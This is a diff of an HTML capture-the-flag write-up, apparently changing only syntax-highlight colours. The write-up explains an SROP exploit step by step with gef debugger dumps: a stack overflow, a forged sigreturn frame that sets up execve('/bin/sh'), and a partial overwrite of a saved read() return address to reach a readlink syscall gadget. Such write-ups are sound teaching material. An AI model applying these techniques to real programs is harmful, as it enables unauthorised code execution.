+    0x7f2810a55581 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">f0832d474b1e0001    </span>  &lt;__libc_start_call_main+0x81&gt;   <span style="color:#6e7781;">lock  </span> <span style="color:#0550ae;">sub</span> <span style="color:#0550ae;">DWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rip</span> <span style="color:#6e7781;">+</span> <span style="color:#0550ae;">0x1e4b47</span><span style="color:#6e7781;">], </span><span style="color:#cf222e;">0x1</span> # 0x7f2810c3a0d0 &lt;_
 _nptl_nthreads&gt;
 <span style="color:#cf222e;">--------------------------------------------------------------------------------------------- memory access: $rax = 0x7f2810c41e28 ----
-</span>$rax  <span style="color:#cf222e;">0x7f2810c41e28</span>|+0x0000|+000: <span style="color:#0550ae;">0x00007fffc5df7ce8</span>  -&gt;  <span style="color:#0550ae;">0x00007fffc5df8ed4</span>  -&gt;  0x504d554a4f545541 <span style="color:#116329;">'AUTOJUMP_ERROR_PATH=/home/wrench
+</span>$rax  <span style="color:#0550ae;">0x7f2810c41e28</span>|+0x0000|+000: <span style="color:#0550ae;">0x00007fffc5df7ce8</span>  -&gt;  <span style="color:#0550ae;">0x00007fffc5df8ed4</span>  -&gt;  0x504d554a4f545541 <span style="color:#116329;">'AUTOJUMP_ERROR_PATH=/home/wrench
 es/.local/share/autojump/errors.[...]'</span>
-      <span style="color:#cf222e;">0x7f2810c41e30</span>|+0x0008|+001: 0x0000000000000000
-      <span style="color:#cf222e;">0x7f2810c41e38</span>|+0x0010|+002: 0x0000000000000000
-      <span style="color:#cf222e;">0x7f2810c41e40</span>|+0x0018|+003: 0x0000000000000000
+      <span style="color:#0550ae;">0x7f2810c41e30</span>|+0x0008|+001: 0x0000000000000000
+      <span style="color:#0550ae;">0x7f2810c41e38</span>|+0x0010|+002: 0x0000000000000000
+      <span style="color:#0550ae;">0x7f2810c41e40</span>|+0x0018|+003: 0x0000000000000000
 </code></pre>
 
 And of course, once we are back in <span class='monospace'>main()</span>, we get our overflow primitive again. This time, however, we have successfully moved upwards on the stack.
@@ -913,20 +913,20 @@ Given that the binary uses the <span class='monospace'>read</span> syscall, <spa
 This layout will look somewhat like this. We first return to one read call (in the middle of <span class='monospace'>main</span>), one random stored <span class='monospace'>rbp</span> value (because our program ends up hitting a <span class='monospace'>leave ; ret</span>), and our <span class='monospace'>syscall</span> gadget, which is <i>directly</i> followed by the SROP frame.
 
 <pre><code><span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>x/16g $rsp
-<span style="color:#cf222e;">0x7fff1ca4d020</span>:	0x0000000000400454	0x000000000040046d
-<span style="color:#cf222e;">0x7fff1ca4d030</span>:	0x000000000040046a	0x00007fff1ca4d218
-<span style="color:#cf222e;">0x7fff1ca4d040</span>:	0x4141414141414141	0x0000000000000000
-<span style="color:#cf222e;">0x7fff1ca4d050</span>:	0x00007fff1ca4d0c0	0x0000000000000002
-<span style="color:#cf222e;">0x7fff1ca4d060</span>:	0x00007f07e32a1000	0x0000000000402e40
-<span style="color:#cf222e;">0x7fff1ca4d070</span>:	0x0000000000000000	0x0000000000400385
-<span style="color:#cf222e;">0x7fff1ca4d080</span>:	0x00007fff1ca4d088	0x0000000000000068
-<span style="color:#cf222e;">0x7fff1ca4d090</span>:	0x4141414141414141	0x4141414141414141
+<span style="color:#0550ae;">0x7fff1ca4d020</span>:	0x0000000000400454	0x000000000040046d
+<span style="color:#0550ae;">0x7fff1ca4d030</span>:	0x000000000040046a	0x00007fff1ca4d218
+<span style="color:#0550ae;">0x7fff1ca4d040</span>:	0x4141414141414141	0x0000000000000000
+<span style="color:#0550ae;">0x7fff1ca4d050</span>:	0x00007fff1ca4d0c0	0x0000000000000002
+<span style="color:#0550ae;">0x7fff1ca4d060</span>:	0x00007f07e32a1000	0x0000000000402e40
+<span style="color:#0550ae;">0x7fff1ca4d070</span>:	0x0000000000000000	0x0000000000400385
+<span style="color:#0550ae;">0x7fff1ca4d080</span>:	0x00007fff1ca4d088	0x0000000000000068
+<span style="color:#0550ae;">0x7fff1ca4d090</span>:	0x4141414141414141	0x4141414141414141
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>x/i 0x00000040046a
-   <span style="color:#cf222e;">0x40046a</span> &lt;<span style="color:#953800;">main</span>+26&gt;:	<span style="color:#116329;">syscall
+   <span style="color:#0550ae;">0x40046a</span> &lt;<span style="color:#953800;">main</span>+26&gt;:	<span style="color:#116329;">syscall
 </span><span style="font-weight:bold;color:#116329;">gef&gt; </span>x/i 0x00000040046d
-=&gt; <span style="color:#cf222e;">0x40046d</span> &lt;<span style="color:#953800;">main</span>+29&gt;:	<span style="color:#116329;">ret</span>
+=&gt; <span style="color:#0550ae;">0x40046d</span> &lt;<span style="color:#953800;">main</span>+29&gt;:	<span style="color:#116329;">ret</span>
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>x/i 0x000000400454
-   <span style="color:#cf222e;">0x400454</span> &lt;<span style="color:#953800;">main</span>+4&gt;:	<span style="color:#116329;">lea    </span><span style="color:#cf222e;">rcx</span>,[<span style="color:#cf222e;">rbp</span><span style="color:#cf222e;">-0x20</span>]
+   <span style="color:#0550ae;">0x400454</span> &lt;<span style="color:#953800;">main</span>+4&gt;:	<span style="color:#116329;">lea    </span><span style="color:#cf222e;">rcx</span>,[<span style="color:#cf222e;">rbp</span><span style="color:#cf222e;">-0x20</span>]
 </code></pre>
 
 The program flow will then complete the read, <span class='monospace'>pop rbp</span>, and then <span class='monospace'>ret</span> to our syscall gadget.
@@ -938,53 +938,53 @@ The program flow will then complete the read, <span class='monospace'>pop rbp</s
     RET                  $rax                 -
     NR                   $rax                 0xf
 <span style="color:#cf222e;">----------------------------------------------------------------------------------------------------------------- threads ----
-</span>[*<span style="color:#116329;">Thread Id:1, tid:1533937</span>] Name: &quot;main&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x00000040046a</span> &lt;main+0x1a&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
+</span>[*<span style="color:#116329;">Thread Id:1, tid:1533937</span>] Name: &quot;main&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x00000040046a</span> &lt;main+0x1a&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
 <span style="color:#cf222e;">------------------------------------------------------------------------------------------------------------------- trace ----
-</span>[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x00000040046a</span> &lt;main+0x1a&gt;
+</span>[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x00000040046a</span> &lt;main+0x1a&gt;
 [ <span style="color:#8250df;">#1</span>] 0xc308c4834808ec83 &lt;NO_SYMBOL&gt;
 [ <span style="color:#8250df;">#2</span>] 0x000000000000 &lt;NO_SYMBOL&gt;
 <span style="color:#cf222e;">------------------------------------------------------------------------------------------------------------------------------
 </span><span style="font-weight:bold;color:#cf222e;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>x/32g $rsp
-<span style="color:#cf222e;">0x7fff1ca4d038</span>:	0x00007fff1ca4d218	0x4141414141414141
-<span style="color:#cf222e;">0x7fff1ca4d048</span>:	0x0000000000000000	0x00007fff1ca4d0c0
-<span style="color:#cf222e;">0x7fff1ca4d058</span>:	0x0000000000000002	0x00007f07e32a1000
-<span style="color:#cf222e;">0x7fff1ca4d068</span>:	0x0000000000402e40	0x0000000000000000
-<span style="color:#cf222e;">0x7fff1ca4d078</span>:	0x0000000000400385	0x00007fff1ca4d088
-<span style="color:#cf222e;">0x7fff1ca4d088</span>:	0x0000000000000068	0x4141414141414141
-<span style="color:#cf222e;">0x7fff1ca4d098</span>:	0x4141414141414141	0x00000000004031e0
-<span style="color:#cf222e;">0x7fff1ca4d0a8</span>:	0x0000000000000000	0x0000000000000005
-<span style="color:#cf222e;">0x7fff1ca4d0b8</span>:	0x0000000000000002	0x0000000000000000
-<span style="color:#cf222e;">0x7fff1ca4d0c8</span>:	0x000000000000003b	0x0000000000000003
-<span style="color:#cf222e;">0x7fff1ca4d0d8</span>:	0x00000000004031e0	0x000000000040046a
+<span style="color:#0550ae;">0x7fff1ca4d038</span>:	0x00007fff1ca4d218	0x4141414141414141
+<span style="color:#0550ae;">0x7fff1ca4d048</span>:	0x0000000000000000	0x00007fff1ca4d0c0
+<span style="color:#0550ae;">0x7fff1ca4d058</span>:	0x0000000000000002	0x00007f07e32a1000
+<span style="color:#0550ae;">0x7fff1ca4d068</span>:	0x0000000000402e40	0x0000000000000000
+<span style="color:#0550ae;">0x7fff1ca4d078</span>:	0x0000000000400385	0x00007fff1ca4d088
+<span style="color:#0550ae;">0x7fff1ca4d088</span>:	0x0000000000000068	0x4141414141414141
+<span style="color:#0550ae;">0x7fff1ca4d098</span>:	0x4141414141414141	0x00000000004031e0
+<span style="color:#0550ae;">0x7fff1ca4d0a8</span>:	0x0000000000000000	0x0000000000000005
+<span style="color:#0550ae;">0x7fff1ca4d0b8</span>:	0x0000000000000002	0x0000000000000000
+<span style="color:#0550ae;">0x7fff1ca4d0c8</span>:	0x000000000000003b	0x0000000000000003
+<span style="color:#0550ae;">0x7fff1ca4d0d8</span>:	0x00000000004031e0	0x000000000040046a
 </code></pre>
 
 Interestingly, note that the SROP frame _does_ end up having some garbage values. The SROP frame does not need to be perfect, as some of the fields will go into unused registers.
 
-<pre><code><span style="color:#cf222e;">0x7fff1ca4d038</span>|+0x0000|+000: rt_sigframe.pretcode                      : <span style="color:#0550ae;">0x00007fff1ca4d218</span>  -&gt;  <span style="color:#0550ae;">0x00007fff1ca4ded4</span>  -&gt;  0x504
+<pre><code><span style="color:#0550ae;">0x7fff1ca4d038</span>|+0x0000|+000: rt_sigframe.pretcode                      : <span style="color:#0550ae;">0x00007fff1ca4d218</span>  -&gt;  <span style="color:#0550ae;">0x00007fff1ca4ded4</span>  -&gt;  0x504
 d554a4f545541 <span style="color:#116329;">'AUTOJUMP_ERROR_PATH=/home/wrenches/.local/share/autojump/errors.[...]'</span>
-<span style="color:#cf222e;">0x7fff1ca4d040</span>|+0x0008|+001: rt_sigframe.uc.uc_flags                   : 0x4141414141414141 <span style="color:#116329;">'AAAAAAAA'</span>
-<span style="color:#cf222e;">0x7fff1ca4d048</span>|+0x0010|+002: rt_sigframe.uc.uc_link                    : 0x0000000000000000
-<span style="color:#cf222e;">0x7fff1ca4d050</span>|+0x0018|+003: rt_sigframe.uc.uc_stack.ss_sp             : <span style="color:#0550ae;">0x00007fff1ca4d0c0</span>  -&gt;  0x0000000000000000
-<span style="color:#cf222e;">0x7fff1ca4d058</span>|+0x0020|+004: rt_sigframe.uc.uc_stack.ss_flags|ss_size  : 0x0000000000000002
-<span style="color:#cf222e;">0x7fff1ca4d060</span>|+0x0028|+005: rt_sigframe.uc.uc_mcontext.r8             : <span style="color:#116329;">0x00007f07e32a1000</span> &lt;_rtld_local&gt;  -&gt;  <span style="color:#116329;">0x00007f07e32a2
+<span style="color:#0550ae;">0x7fff1ca4d040</span>|+0x0008|+001: rt_sigframe.uc.uc_flags                   : 0x4141414141414141 <span style="color:#116329;">'AAAAAAAA'</span>
+<span style="color:#0550ae;">0x7fff1ca4d048</span>|+0x0010|+002: rt_sigframe.uc.uc_link                    : 0x0000000000000000
+<span style="color:#0550ae;">0x7fff1ca4d050</span>|+0x0018|+003: rt_sigframe.uc.uc_stack.ss_sp             : <span style="color:#0550ae;">0x00007fff1ca4d0c0</span>  -&gt;  0x0000000000000000
+<span style="color:#0550ae;">0x7fff1ca4d058</span>|+0x0020|+004: rt_sigframe.uc.uc_stack.ss_flags|ss_size  : 0x0000000000000002
+<span style="color:#0550ae;">0x7fff1ca4d060</span>|+0x0028|+005: rt_sigframe.uc.uc_mcontext.r8             : <span style="color:#116329;">0x00007f07e32a1000</span> &lt;_rtld_local&gt;  -&gt;  <span style="color:#116329;">0x00007f07e32a2
 5f0</span>  -&gt;  0x0000000000000000<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  $r14</span>
-<span style="color:#cf222e;">0x7fff1ca4d068</span>|+0x0030|+006: rt_sigframe.uc.uc_mcontext.r9             : <span style="color:#6e7781;">0x0000000000402e40</span> &lt;__do_global_dtors_aux_fini_array_
-entry&gt;  -&gt;  <span style="color:#cf222e;">0x0000000000400410</span> &lt;__do_global_dtors_aux&gt;  -&gt;  0x2be93d80fa1e0ff3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  $r15</span>
-<span style="color:#cf222e;">0x7fff1ca4d070</span>|+0x0038|+007: rt_sigframe.uc.uc_mcontext.r10            : 0x0000000000000000
-<span style="color:#cf222e;">0x7fff1ca4d078</span>|+0x0040|+008: rt_sigframe.uc.uc_mcontext.r11            : <span style="color:#cf222e;">0x0000000000400385</span> &lt;_start+0x25&gt;  -&gt;  0x0000841f0f2e6
+<span style="color:#0550ae;">0x7fff1ca4d068</span>|+0x0030|+006: rt_sigframe.uc.uc_mcontext.r9             : <span style="color:#6e7781;">0x0000000000402e40</span> &lt;__do_global_dtors_aux_fini_array_
+entry&gt;  -&gt;  <span style="color:#0550ae;">0x0000000000400410</span> &lt;__do_global_dtors_aux&gt;  -&gt;  0x2be93d80fa1e0ff3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  $r15</span>
+<span style="color:#0550ae;">0x7fff1ca4d070</span>|+0x0038|+007: rt_sigframe.uc.uc_mcontext.r10            : 0x0000000000000000
+<span style="color:#0550ae;">0x7fff1ca4d078</span>|+0x0040|+008: rt_sigframe.uc.uc_mcontext.r11            : <span style="color:#0550ae;">0x0000000000400385</span> &lt;_start+0x25&gt;  -&gt;  0x0000841f0f2e6
 6f4
-<span style="color:#cf222e;">0x7fff1ca4d080</span>|+0x0048|+009: rt_sigframe.uc.uc_mcontext.r12            : <span style="color:#0550ae;">0x00007fff1ca4d088</span>  -&gt;  0x0000000000000068
-<span style="color:#cf222e;">0x7fff1ca4d088</span>|+0x0050|+010: rt_sigframe.uc.uc_mcontext.r13            : 0x0000000000000068
-<span style="color:#cf222e;">0x7fff1ca4d090</span>|+0x0058|+011: rt_sigframe.uc.uc_mcontext.r14            : 0x4141414141414141
-<span style="color:#cf222e;">0x7fff1ca4d098</span>|+0x0060|+012: rt_sigframe.uc.uc_mcontext.r15            : 0x4141414141414141
-<span style="color:#cf222e;">0x7fff1ca4d0a0</span>|+0x0068|+013: rt_sigframe.uc.uc_mcontext.rdi            : <span style="color:#116329;">0x00000000004031e0</span>  -&gt;  0x0068732f6e69622f (<span style="color:#116329;">'/bin/sh'
+<span style="color:#0550ae;">0x7fff1ca4d080</span>|+0x0048|+009: rt_sigframe.uc.uc_mcontext.r12            : <span style="color:#0550ae;">0x00007fff1ca4d088</span>  -&gt;  0x0000000000000068
+<span style="color:#0550ae;">0x7fff1ca4d088</span>|+0x0050|+010: rt_sigframe.uc.uc_mcontext.r13            : 0x0000000000000068
+<span style="color:#0550ae;">0x7fff1ca4d090</span>|+0x0058|+011: rt_sigframe.uc.uc_mcontext.r14            : 0x4141414141414141
+<span style="color:#0550ae;">0x7fff1ca4d098</span>|+0x0060|+012: rt_sigframe.uc.uc_mcontext.r15            : 0x4141414141414141
+<span style="color:#0550ae;">0x7fff1ca4d0a0</span>|+0x0068|+013: rt_sigframe.uc.uc_mcontext.rdi            : <span style="color:#116329;">0x00000000004031e0</span>  -&gt;  0x0068732f6e69622f (<span style="color:#116329;">'/bin/sh'
 </span>?)<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  $rsi</span>
-<span style="color:#cf222e;">0x7fff1ca4d0a8</span>|+0x0070|+014: rt_sigframe.uc.uc_mcontext.rsi            : 0x0000000000000000
-<span style="color:#cf222e;">0x7fff1ca4d0b0</span>|+0x0078|+015: rt_sigframe.uc.uc_mcontext.rbp            : 0x0000000000000005
-<span style="color:#cf222e;">0x7fff1ca4d0b8</span>|+0x0080|+016: rt_sigframe.uc.uc_mcontext.rbx            : 0x0000000000000002
-<span style="color:#cf222e;">0x7fff1ca4d0c0</span>|+0x0088|+017: rt_sigframe.uc.uc_mcontext.rdx            : 0x0000000000000000
-<span style="color:#cf222e;">0x7fff1ca4d0c8</span>|+0x0090|+018: rt_sigframe.uc.uc_mcontext.rax            : 0x000000000000003b
-<span style="color:#cf222e;">0x7fff1ca4d0d0</span>|+0x0098|+019: rt_sigframe.uc.uc_mcontext.rcx            : 0x0000000000000003
+<span style="color:#0550ae;">0x7fff1ca4d0a8</span>|+0x0070|+014: rt_sigframe.uc.uc_mcontext.rsi            : 0x0000000000000000
+<span style="color:#0550ae;">0x7fff1ca4d0b0</span>|+0x0078|+015: rt_sigframe.uc.uc_mcontext.rbp            : 0x0000000000000005
+<span style="color:#0550ae;">0x7fff1ca4d0b8</span>|+0x0080|+016: rt_sigframe.uc.uc_mcontext.rbx            : 0x0000000000000002
+<span style="color:#0550ae;">0x7fff1ca4d0c0</span>|+0x0088|+017: rt_sigframe.uc.uc_mcontext.rdx            : 0x0000000000000000
+<span style="color:#0550ae;">0x7fff1ca4d0c8</span>|+0x0090|+018: rt_sigframe.uc.uc_mcontext.rax            : 0x000000000000003b
+<span style="color:#0550ae;">0x7fff1ca4d0d0</span>|+0x0098|+019: rt_sigframe.uc.uc_mcontext.rcx            : 0x0000000000000003
 </code></pre>
 
 Anyways, after this our SROP ends up succeeding and we get a shell. Yay!
@@ -992,7 +992,7 @@ Anyways, after this our SROP ends up succeeding and we get a shell. Yay!
 <pre><code>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x40045d bf00000000            &lt;main+0xd&gt;   mov    edi, 0x0</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x400462 4889ce                &lt;main+0x12&gt;   mov    rsi, rcx</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x400465 ba80000000            &lt;main+0x15&gt;   mov    edx, 0x80</span>
- -&gt; <span style="color:#cf222e;">0x40046a</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0f05                </span> <span style="color:#cf222e;"> &lt;main+0x1a&gt;</span>   <span style="color:#8250df;">syscall</span>
+ -&gt; <span style="color:#0550ae;">0x40046a</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0f05                </span> <span style="color:#cf222e;"> &lt;main+0x1a&gt;</span>   <span style="color:#8250df;">syscall</span>
     0x40046c <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">5d                  </span>  &lt;main+0x1c&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">rbp</span>
     0x40046d <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">c3                  </span>  &lt;main+0x1d&gt;   <span style="color:#8250df;">ret
 </span>    0x40046e <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0000                </span>  &lt;NO_SYMBOL&gt;   <span style="color:#6e7781;">add   </span> <span style="color:#0550ae;">BYTE</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rax</span><span style="color:#6e7781;">], </span><span style="color:#0550ae;">al</span>
@@ -1008,9 +1008,9 @@ Anyways, after this our SROP ends up succeeding and we get a shell. Yay!
     argv                 $rsi                 0x0000000000000000
     envp                 $rdx                 0x0000000000000000
 <span style="color:#cf222e;">----------------------------------------------------------------------------------------------------------------- threads ----
-</span>[*<span style="color:#116329;">Thread Id:1, tid:1533937</span>] Name: &quot;main&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x00000040046a</span> &lt;main+0x1a&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
+</span>[*<span style="color:#116329;">Thread Id:1, tid:1533937</span>] Name: &quot;main&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x00000040046a</span> &lt;main+0x1a&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
 <span style="color:#cf222e;">------------------------------------------------------------------------------------------------------------------- trace ----
-</span>[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x00000040046a</span> &lt;main+0x1a&gt;
+</span>[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x00000040046a</span> &lt;main+0x1a&gt;
 <span style="color:#cf222e;">------------------------------------------------------------------------------------------------------------------------------
 </span><span style="font-weight:bold;color:#cf222e;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>
 </code></pre>
@@ -1059,12 +1059,12 @@ Anyways very standard. <span class='monospace'>0x1000</span> (wow, generous) byt
 Anyways, the solution is also SROP for this challenge. We don't have any <span class='monospace'>syscall</span> gadgets in the binary, but using the same trick from earlier (leaving <span class='monospace'>libc</span> pointers on the stack through I/O func calls), we see that two specific <span class='monospace'>libc</span> pointers are given to us.
 
 <pre><code><span style="color:#cf222e;">[+]</span> Searching for addresses in '<span style="color:#953800;">main</span>' that point to '<span style="color:#953800;">ld</span>'
-<span style="color:#953800;">main_patched</span>: <span style="color:#6e7781;">0x0000000000403fd0</span> &lt;read@got[plt]&gt;  -&gt;  <span style="color:#cf222e;">0x00007f9545bdf480</span> &lt;read&gt;  -&gt;  0x48f0894810ec8348
-<span style="color:#953800;">main_patched</span>: <span style="color:#6e7781;">0x0000000000403fd8</span> &lt;__libc_start_main@got.plt&gt;  -&gt;  <span style="color:#cf222e;">0x00007f9545bb649d</span> &lt;__libc_start_main&gt;  -&gt;  0xfc8949c663485441
-<span style="color:#953800;">main_patched</span>: <span style="color:#116329;">0x00000000004041b8</span>  -&gt;  <span style="color:#cf222e;">0x00007f9545bdacb5</span>  -&gt;  0x5375fcf88348595a
-<span style="color:#953800;">main_patched</span>: <span style="color:#116329;">0x00000000004041e8</span>  -&gt;  <span style="color:#cf222e;">0x00007f9545bdf49f</span> &lt;read+0x1f&gt;  -&gt;  0xe9c7894818c48348
-<span style="color:#953800;">main_patched</span>: <span style="color:#116329;">0x00000000004042b8</span>  -&gt;  <span style="color:#cf222e;">0x00007f9545bdacb5</span>  -&gt;  0x5375fcf88348595a
-<span style="color:#953800;">main_patched</span>: <span style="color:#116329;">0x00000000004042e8</span>  -&gt;  <span style="color:#cf222e;">0x00007f9545bdf49f</span> &lt;read+0x1f&gt;  -&gt;  0xe9c7894818c48348
+<span style="color:#953800;">main_patched</span>: <span style="color:#6e7781;">0x0000000000403fd0</span> &lt;read@got[plt]&gt;  -&gt;  <span style="color:#0550ae;">0x00007f9545bdf480</span> &lt;read&gt;  -&gt;  0x48f0894810ec8348
+<span style="color:#953800;">main_patched</span>: <span style="color:#6e7781;">0x0000000000403fd8</span> &lt;__libc_start_main@got.plt&gt;  -&gt;  <span style="color:#0550ae;">0x00007f9545bb649d</span> &lt;__libc_start_main&gt;  -&gt;  0xfc8949c663485441
+<span style="color:#953800;">main_patched</span>: <span style="color:#116329;">0x00000000004041b8</span>  -&gt;  <span style="color:#0550ae;">0x00007f9545bdacb5</span>  -&gt;  0x5375fcf88348595a
+<span style="color:#953800;">main_patched</span>: <span style="color:#116329;">0x00000000004041e8</span>  -&gt;  <span style="color:#0550ae;">0x00007f9545bdf49f</span> &lt;read+0x1f&gt;  -&gt;  0xe9c7894818c48348
+<span style="color:#953800;">main_patched</span>: <span style="color:#116329;">0x00000000004042b8</span>  -&gt;  <span style="color:#0550ae;">0x00007f9545bdacb5</span>  -&gt;  0x5375fcf88348595a
+<span style="color:#953800;">main_patched</span>: <span style="color:#116329;">0x00000000004042e8</span>  -&gt;  <span style="color:#0550ae;">0x00007f9545bdf49f</span> &lt;read+0x1f&gt;  -&gt;  0xe9c7894818c48348
 </code></pre>
 
 Note that the function called is <span class='monospace'>read()</span>, which does not ⍉ terminate the buffer we read into. <span class='monospace'>read()</span> is extremely nice and gives us very fine-grained control over what bytes we specifically want to write, so we can partially overwrite the least significant bytes of these saved return addresses to point to a more useful gadget.
@@ -1074,22 +1074,22 @@ Note that the function called is <span class='monospace'>read()</span>, which do
 It is easy to find a target gadget to overwrite to - we just look around at what's within snapping distance from our saved pointers. It turns out that <span class='monospace'>read</span> and <span class='monospace'>readlink</span> are directly adjacent to one another in this <span class='monospace'>libc</span>'s <span class='monospace'>.text</span> section. <span class='monospace'>readlink</span> has a syscall gadget.
 
 <pre><code><span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>x/16i 0x00007f9545bdf49f
-   <span style="color:#cf222e;">0x7f9545bdf49f</span> &lt;<span style="color:#953800;">read</span>+31&gt;:	<span style="color:#116329;">add    </span><span style="color:#cf222e;">rsp</span>,<span style="color:#cf222e;">0x18</span>
-   <span style="color:#cf222e;">0x7f9545bdf4a3</span> &lt;<span style="color:#953800;">read</span>+35&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">rdi</span>,<span style="color:#cf222e;">rax</span>
-   <span style="color:#cf222e;">0x7f9545bdf4a6</span> &lt;<span style="color:#953800;">read</span>+38&gt;:	<span style="color:#116329;">jmp    </span><span style="color:#cf222e;">0x7f9545bb72da</span> &lt;<span style="color:#953800;">fetestexcept</span>+668&gt;
-   <span style="color:#cf222e;">0x7f9545bdf4ab</span> &lt;<span style="color:#953800;">readlink</span>&gt;:	<span style="color:#116329;">sub    </span><span style="color:#cf222e;">rsp</span>,<span style="color:#cf222e;">0x18</span>
-   <span style="color:#cf222e;">0x7f9545bdf4af</span> &lt;<span style="color:#953800;">readlink</span>+4&gt;:	<span style="color:#116329;">lea    </span><span style="color:#cf222e;">r8</span>,[<span style="color:#cf222e;">rsp</span>+<span style="color:#cf222e;">0xf</span>]
-   <span style="color:#cf222e;">0x7f9545bdf4b4</span> &lt;<span style="color:#953800;">readlink</span>+9&gt;:	<span style="color:#116329;">test   </span><span style="color:#cf222e;">rdx</span>,<span style="color:#cf222e;">rdx</span>
-   <span style="color:#cf222e;">0x7f9545bdf4b7</span> &lt;<span style="color:#953800;">readlink</span>+12&gt;:	<span style="color:#116329;">jne    </span><span style="color:#cf222e;">0x7f9545bdf4c6</span> &lt;<span style="color:#953800;">readlink</span>+27&gt;
-   <span style="color:#cf222e;">0x7f9545bdf4b9</span> &lt;<span style="color:#953800;">readlink</span>+14&gt;:	<span style="color:#116329;">lea    </span><span style="color:#cf222e;">r8</span>,[<span style="color:#cf222e;">rsp</span>+<span style="color:#cf222e;">0xf</span>]
-   <span style="color:#cf222e;">0x7f9545bdf4be</span> &lt;<span style="color:#953800;">readlink</span>+19&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">edx</span>,<span style="color:#cf222e;">0x1</span>
-   <span style="color:#cf222e;">0x7f9545bdf4c3</span> &lt;<span style="color:#953800;">readlink</span>+24&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">rsi</span>,<span style="color:#cf222e;">r8</span>
-   <span style="color:#cf222e;">0x7f9545bdf4c6</span> &lt;<span style="color:#953800;">readlink</span>+27&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">eax</span>,<span style="color:#cf222e;">0x59</span>
-   <span style="color:#cf222e;">0x7f9545bdf4cb</span> &lt;<span style="color:#953800;">readlink</span>+32&gt;:	<span style="color:#116329;">syscall</span>
-   <span style="color:#cf222e;">0x7f9545bdf4cd</span> &lt;<span style="color:#953800;">readlink</span>+34&gt;:	<span style="color:#116329;">xor    </span><span style="color:#cf222e;">edx</span>,<span style="color:#cf222e;">edx</span>
-   <span style="color:#cf222e;">0x7f9545bdf4cf</span> &lt;<span style="color:#953800;">readlink</span>+36&gt;:	<span style="color:#116329;">test   </span><span style="color:#cf222e;">eax</span>,<span style="color:#cf222e;">eax</span>
-   <span style="color:#cf222e;">0x7f9545bdf4d1</span> &lt;<span style="color:#953800;">readlink</span>+38&gt;:	<span style="color:#116329;">cmovle </span><span style="color:#cf222e;">edx</span>,<span style="color:#cf222e;">eax</span>
-   <span style="color:#cf222e;">0x7f9545bdf4d4</span> &lt;<span style="color:#953800;">readlink</span>+41&gt;:	<span style="color:#116329;">cmp    </span><span style="color:#cf222e;">rsi</span>,<span style="color:#cf222e;">r8</span>
+   <span style="color:#0550ae;">0x7f9545bdf49f</span> &lt;<span style="color:#953800;">read</span>+31&gt;:	<span style="color:#116329;">add    </span><span style="color:#cf222e;">rsp</span>,<span style="color:#cf222e;">0x18</span>
+   <span style="color:#0550ae;">0x7f9545bdf4a3</span> &lt;<span style="color:#953800;">read</span>+35&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">rdi</span>,<span style="color:#cf222e;">rax</span>
+   <span style="color:#0550ae;">0x7f9545bdf4a6</span> &lt;<span style="color:#953800;">read</span>+38&gt;:	<span style="color:#116329;">jmp    </span><span style="color:#0550ae;">0x7f9545bb72da</span> &lt;<span style="color:#953800;">fetestexcept</span>+668&gt;
+   <span style="color:#0550ae;">0x7f9545bdf4ab</span> &lt;<span style="color:#953800;">readlink</span>&gt;:	<span style="color:#116329;">sub    </span><span style="color:#cf222e;">rsp</span>,<span style="color:#cf222e;">0x18</span>
+   <span style="color:#0550ae;">0x7f9545bdf4af</span> &lt;<span style="color:#953800;">readlink</span>+4&gt;:	<span style="color:#116329;">lea    </span><span style="color:#cf222e;">r8</span>,[<span style="color:#cf222e;">rsp</span>+<span style="color:#cf222e;">0xf</span>]
+   <span style="color:#0550ae;">0x7f9545bdf4b4</span> &lt;<span style="color:#953800;">readlink</span>+9&gt;:	<span style="color:#116329;">test   </span><span style="color:#cf222e;">rdx</span>,<span style="color:#cf222e;">rdx</span>
